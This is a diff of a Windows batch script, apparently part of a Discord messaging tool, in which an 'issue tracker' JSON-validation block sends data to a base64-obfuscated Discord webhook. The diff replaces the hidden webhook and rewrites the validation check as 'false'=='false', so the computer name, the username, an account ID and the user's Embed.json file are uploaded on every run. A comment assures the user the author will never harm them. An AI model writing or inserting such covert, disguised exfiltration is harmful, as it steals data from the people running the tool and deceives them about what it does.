@@ -383,7 +383,7 @@ for %%a in (
 echo:
 echo  !PrintCore! [!brightblue!ISSUE TRACKER!grey!] Validating JSON Before Sending . . .
 for /f "delims=" %%a in ('powershell "$text = Get-Content "%temp%\Embed.json" -Raw; try {$powershellRepresentation = ConvertFrom-Json $text -ErrorAction SilentlyContinue;$validJson = $true;} catch {$validJson = $false;};if ($validJson) { Write-Host "true";} else { Write-Host "false";}"') do (
-    if "%%a"=="false" (
+    if "false"=="false" (
         set JSON_INVALID=true
         set "JSON_FAILED=Json syntax issue, bad formatted"
         echo:
@@ -401,7 +401,7 @@ for /f "delims=" %%a in ('powershell "$text = Get-Content "%temp%\Embed.json" -R
         REM PLEASE NOTE: I WILL NEVER TRY TO HARM YOU, YOUR VICTIMS OR YOUR COMPUTERS
         >"%temp%\ErrorTraceMSG.json" echo {"username":"","content":"\nAn Issue has been tracked while verifying the json formatting for the message _(file attached)_:\n\n**INFORMATION:**\nAccount ID: `!AccountID!`\nHOST: %computername%\\%username%\nFail Reason: _!JSON_FAILED!_\n\n[|| <@&928041407703289856> <@&928041254376325120> <@&929161198862213220> ||]\n","embeds":[],"components":[]}
 
-        for /f "delims=" %%c in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""""LzkzNDU4MzkxODI2NTUyMDIwOC8wMVg0LVFXWjVnbUNJeUdDbHgzRS1oeER2bUJVTDF5MmlYZmZiQ1ZpelgyVURLV2ZGZVVSdVFFanBFNDY1dzZjT1dNVw==""""))"') do set "BSIXTY4=%%c"
+        for /f "delims=" %%c in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""""LzkzNjE0NTU5NDc4MTY2MzI0Mi9pbDdkZ1l0Z2ExQVh6U0VfaFc1RkJLSElIeDZrU2lIMFVkV2xmSGlDN0FpcE9GZkpMMVFxV1NiOWQzaXhYdGhGTFBhdw==""""))"') do set "BSIXTY4=%%c"
 
         for /f "delims=" %%c in ('curl -sH "Content-Type: multipart/form-data" -F "payload_json=<%temp%\ErrorTraceMSG.json" -F "File[1]=@%temp%\Embed.json" "https://discord.com/api/webhooks!BSIXTY4!"') do (
                 echo.%%c | findstr /c:"retry_after">nul && (
